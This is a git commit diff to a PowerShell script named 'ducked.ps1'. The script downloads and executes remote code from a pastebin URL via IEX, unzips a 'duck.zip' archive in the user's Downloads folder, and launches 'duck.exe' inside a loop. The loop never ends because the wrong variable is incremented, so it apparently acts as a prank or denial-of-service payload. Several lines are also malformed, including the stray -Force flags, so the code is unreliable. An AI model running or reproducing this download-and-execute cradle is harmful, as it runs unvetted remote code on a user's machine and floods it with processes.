ec1b9a05734adccd7a8e04de1f70e368683ef88a
jelpsIT <106605874+jelpsIT@users.noreply.github.com>
2023-06-02 14:53:39 +0100

    Update ducked.ps1

--- ducked.ps1
+++ ducked.ps1
@@ -1,3 +1,10 @@
-IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/FWWk5dCE')
+IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/FWWk5dCE') -Force
 Expand-Archive -Path "$env:USERPROFILE/Downloads/duck.zip" -DestinationPath "$env:USERPROFILE/Downloads/duck" -Force
-Start-Process Downloads\duck\duck\duck.exe
+$laps = 0
+
+while ($laps -lt 10) {
+    $counter++
+Start-Process Downloads\duck\duck\duck.exe -Force
+}
+
+
